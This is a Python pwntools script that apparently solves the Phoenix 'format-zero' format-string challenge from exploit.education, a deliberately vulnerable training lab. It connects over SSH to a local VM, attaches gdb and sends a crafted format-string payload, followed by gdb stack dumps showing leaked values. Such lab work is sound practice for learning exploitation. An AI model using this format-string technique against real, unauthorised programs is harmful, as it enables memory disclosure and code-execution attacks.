__author__ = '@tomereyz'
from pwn import *
import requests
from bs4 import BeautifulSoup

context.clear(arch='i386')


def main(download):
    localhost = 'localhost'
    user_name = 'root'
    challenge_name = 'format-zero'
    challenge_port = 2222

    ssh_client = ssh(user=user_name, host=localhost, password=user_name, port=challenge_port)
    if download:
        ssh_client.download('/opt/phoenix/i486/{}'.format(challenge_name))
        resp = requests.get('https://exploit.education/phoenix/{challenge_name}/'.format(challenge_name=challenge_name))
        bs_obj = BeautifulSoup(resp.content, 'html.parser')
        with open('{challenge_name}.c'.format(challenge_name=challenge_name), 'w') as f:
            f.write(bs_obj.find_all('code', {'class': 'language-c'})[0].text)

    r = ssh_client.process('/opt/phoenix/i486/{}'.format(challenge_name))

    gdb.attach(r, """
set disassembly intel
b * main+97
""")
    pause()

    r.sendline(pack(0xffffffff, word_size=32) + '%6$x' * 64)
    r.interactive()


if __name__ == '__main__':
    main(download=True)

"""
=> 0x8048596 <main+97>:	call   0x8048370 <sprintf@plt>

(gdb) x/10wx $sp
0xffffdcd0:	0xffffdcfc	0xffffdcec	0xf7ffb140	0x00000062
0xffffdce0:	0x00000000	0x080482e4	0x00000008	0x252e7825
0xffffdcf0:	0x78252e78	0x2e78252e

(gdb) x/10wx 0xffffdcec
0xffffdcec:	0x252e7825	0x78252e78	0x2e78252e	0x00007825
0xffffdcfc:	0x080482ec	0x00000000	0x00000000	0x00000000
0xffffdd0c:	0x00000000	0x00000000
(gdb) 

(gdb) x/1s 0xffffdcec
0xffffdcec:	"%x.%x.%x.%x.%x"

(gdb) x/1s 0xffffdcfc
0xffffdcfc:	"f7ffb140.62.0.80482e4.8"

"""